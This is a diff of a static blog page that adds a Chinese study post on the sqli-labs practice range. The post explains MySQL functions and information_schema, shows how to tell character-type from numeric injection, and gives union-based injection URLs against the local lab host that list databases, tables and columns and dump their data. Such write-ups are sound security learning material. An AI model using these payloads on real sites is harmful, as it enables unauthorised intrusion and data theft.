@@ -71,6 +71,123 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sqlilab1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/12/01/sqlilab1/" class="article-date">
+  <time class="dt-published" datetime="2022-11-30T16:58:44.000Z" itemprop="datePublished">2022-12-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/12/01/sqlilab1/">sqlilab1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>关于SQL注入<br>在练习靶场之前，我们首先要了解什么是SQL注入。SQL注入常常发生在通过网页获取用户输入的数据并将其插入MySQL数据库中，黑客通过把SQL命令插入到域名、web表单等手段达到欺骗服务器的目的，因此网站都会对用户输入的数据进行过滤来进行保护。</p>
+<p>而在练习靶场中，我们就需要通过SQL注入的方式获得数据库中的数据，下面我就总结一下在一到六关我所用到的知识。</p>
+<p>1.首先先了解一下数据库常用函数与参数。<br>&#x3D;、&gt;、&gt;&#x3D;、&lt;&#x3D; 、&lt;&gt;</p>
+<p>比较运算符</p>
+<p>and、or</p>
+<p>逻辑运算符</p>
+<p>version( )</p>
+<p>mysql数据库版本</p>
+<p>database( )</p>
+<p>当前数据库名</p>
+<p>sleep( )</p>
+<p>睡眠时间为指定的秒数</p>
+<p>if(true,t,f)</p>
+<p>if判断</p>
+<p>length( )</p>
+<p>返回字符串的长度</p>
+<p>substring( )</p>
+<p>截取字符串</p>
+<p>三个函数作用相同</p>
+<p>有三个参数 mid(“1”,2,3)</p>
+<p>1.截取的字符串</p>
+<p>2.截取起始位置，从1开始计数</p>
+<p>3.截取长度</p>
+<p>substr( )</p>
+<p>mid( )</p>
+<p>left( )</p>
+<p>从左侧开始取指定字符个数的字符串</p>
+<p>concat( )</p>
+<p>没有分隔符的连接字符串</p>
+<p>concat_ws ( )</p>
+<p>含有分割符的连接字符串</p>
+<p>group_conat( )</p>
+<p>连接一个组的字符串</p>
+<p>ord( )</p>
+<p>返回ASCII码</p>
+<p>ascii( )</p>
+<p>hex( )</p>
+<p>将字符串转换为十六进制</p>
+<p>unhex( )</p>
+<p>hex的反向操作</p>
+<p>md5( )</p>
+<p>返回MD5值</p>
+<p>floor(x)</p>
+<p>返回不大于x的最大整数</p>
+<p>round ( )</p>
+<p>返回参数x接近的整数</p>
+<p>rand( )</p>
+<p>返回0-1之间的随机浮点数</p>
+<p>load_file( )</p>
+<p>读取文件，并返回文件内容作为一个字符串</p>
+<p>find_in_set( )</p>
+<p>返回字符串在字符串列表中的位置</p>
+<p>benchmark( )</p>
+<p>指定语句执行的次数</p>
+<p>name_const ( )</p>
+<p>返回表作为结果</p>
+<p>user( )</p>
+<p>用户名</p>
+<p>current_user( )</p>
+<p>当前用户名</p>
+<p>system_ user( )</p>
+<p>系统用户名</p>
+<p>@@datadir</p>
+<p>数据库路径</p>
+<p>@@versoin_compile_os</p>
+<p>操作系统版本</p>
+<p>mysql5.0版本之后，会在数据库中存放一个information_schema的数据库，在该库，我们需要记住三个表名，分别是schemata，tables，colums</p>
+<p>在schemata表中存储该用户创建的所有数据库的库名，在该表中 记录数据库库名的字段名为：schema_name</p>
+<p>tables中存储该用户创建的所有数据的库名和表名，在这个表中记录数据库库名和表名的字段名分别为 table_schema和table_name</p>
+<p>columns表存储该用户创建的所有数据库的库名，表名和字段名，在该表中记录数据库库名，表名和字段名的字段名为table_schema,table_name,column_name;<br>2.我们可以通过这样判断存在注入。<br>若在GET请求中?id&#x3D;1 and 1&#x3D;1和?id&#x3D;1 and 1&#x3D;2都没有报错，则是字符型注入。<br>若在GET请求中?id&#x3D;1 and 1&#x3D;1没有报错，但是?id&#x3D;1 and 1&#x3D;2有异常或没回显，则是数字型注入。<br>因为若注入 ?id&#x3D;1 and 1&#x3D;2 ，则数据库中查询语句为： select * from user where id&#x3D;’1 and 1&#x3D;2’;因为id为int类型，所以传入的 ‘1 and 1&#x3D;2’ 会强制转换成 ‘1’ ，&#x3D;&gt;最终数据库中的查询语句为：select * from user where id&#x3D;’1’;所以sql语句不会报错。</p>
+<p>若是数字型注入，注入 ?id&#x3D;1 and 1&#x3D;2 时的SQL语句为：select * from users where id&#x3D;1 and 1&#x3D;2 因为 select * from users where id&#x3D;1 是正确的语句 ，and 后面的 1&#x3D;2 是错误的语句，所以select * from users where id&#x3D;1 and 1&#x3D;2 会有异常或着网页没有回显（当一个错误的语句和一个正确的语句用and连接符连接时，整体就会是错误的 ）。</p>
+<p>3.联合注入<br>判断有几列（能正常显示到几就是有几行）：</p>
+<p>1<br>sqli&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1’ order by n–+(此处n为列数）<br>使用union,id&#x3D;错误值<br>3、判断回显点（联合查询时代替可以显示的数字）：</p>
+<p>1<br><a target="_blank" rel="noopener" href="http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,3--+">http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,3--+</a><br>4、获得全部数据库名称：</p>
+<p>1<br><a target="_blank" rel="noopener" href="http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(schema_name)%20from%20information_schema.schemata--+">http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(schema_name)%20from%20information_schema.schemata--+</a><br>5、获得当前数据库名字：</p>
+<p>1<br><a target="_blank" rel="noopener" href="http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,database()--+">http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,database()--+</a><br>6、获得数据库内所有表的名称：</p>
+<p>1<br><a target="_blank" rel="noopener" href="http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%27--+">http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27数据库名%27--+</a><br>7、获得数据表中每列的名称：</p>
+<p>1<br><a target="_blank" rel="noopener" href="http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27%E8%A1%A8%E5%90%8D%27--+">http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27表名%27--+</a><br>8、我们就可以获得我们想要的信息了：</p>
+<p>1<br><a target="_blank" rel="noopener" href="http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(%E5%88%97%E5%90%8D)%20from%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D.%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D--+">http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(列名)%20from%20数据库名.数据表名--+</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/12/01/sqlilab1/" data-id="clb4bgqtg0002hott2my3fqt3" data-title="sqlilab1" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-mysql" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/11/25/mysql/" class="article-date">
@@ -103,7 +220,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/11/25/mysql/" data-id="clb3tff3100022kttctpn9rn1" data-title="mysql" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/11/25/mysql/" data-id="clb4bgqth0003hott5e2g49il" data-title="mysql" class="article-share-link">Share</a>
       
       
       
@@ -149,7 +266,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/11/24/today/" data-id="clb3tff3300042ktt9vt1grkc" data-title="today" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/11/24/today/" data-id="clb4bgqth0004hottbw4i24wg" data-title="today" class="article-share-link">Share</a>
       
       
       
@@ -197,7 +314,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/11/20/%E4%BB%8E%E4%BB%8A%E5%A4%A9%E8%B5%B7%E5%9D%9A%E6%8C%81%E5%8F%91%E5%8D%9A%E5%AE%A2/" data-id="clb3tff3400052ktt6kt4ccwb" data-title="打卡博客，记录web成长" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/11/20/%E4%BB%8E%E4%BB%8A%E5%A4%A9%E8%B5%B7%E5%9D%9A%E6%8C%81%E5%8F%91%E5%8D%9A%E5%AE%A2/" data-id="clb4bgqti0006hottgptlcpzv" data-title="打卡博客，记录web成长" class="article-share-link">Share</a>
       
       
       
@@ -236,7 +353,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/09/25/%E2%80%9C%E7%AC%AC%E4%BA%8C%E7%AF%87%E2%80%9D/" data-id="clb3tff3000012kttbd1j27ee" data-title="“第二篇”" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/09/25/%E2%80%9C%E7%AC%AC%E4%BA%8C%E7%AF%87%E2%80%9D/" data-id="clb4bgqti0005hott1fn7dzuv" data-title="“第二篇”" class="article-share-link">Share</a>
       
       
       
@@ -275,7 +392,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/09/20/1/" data-id="clb3tff2x00002ktthb0t0dlz" data-title="1" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/09/20/1/" data-id="clb4bgqtc0000hott0eh53qfz" data-title="1" class="article-share-link">Share</a>
       
       
       
@@ -326,7 +443,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/09/19/hello-world/" data-id="clb3tff3200032ktt88cnbaoz" data-title="Hello World" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/09/19/hello-world/" data-id="clb4bgqtf0001hottbbcmgxq3" data-title="Hello World" class="article-share-link">Share</a>
       
       
       
@@ -356,7 +473,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li></ul>
     </div>
   </div>
 
@@ -367,6 +484,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2022/12/01/sqlilab1/">sqlilab1</a>
+          </li>
         
           <li>
             <a href="/2022/11/25/mysql/">mysql</a>
@@ -382,10 +503,6 @@
         
           <li>
             <a href="/2022/09/25/%E2%80%9C%E7%AC%AC%E4%BA%8C%E7%AF%87%E2%80%9D/">“第二篇”</a>
-          </li>
-        
-          <li>
-            <a href="/2022/09/20/1/">1</a>
           </li>
         
       </ul>
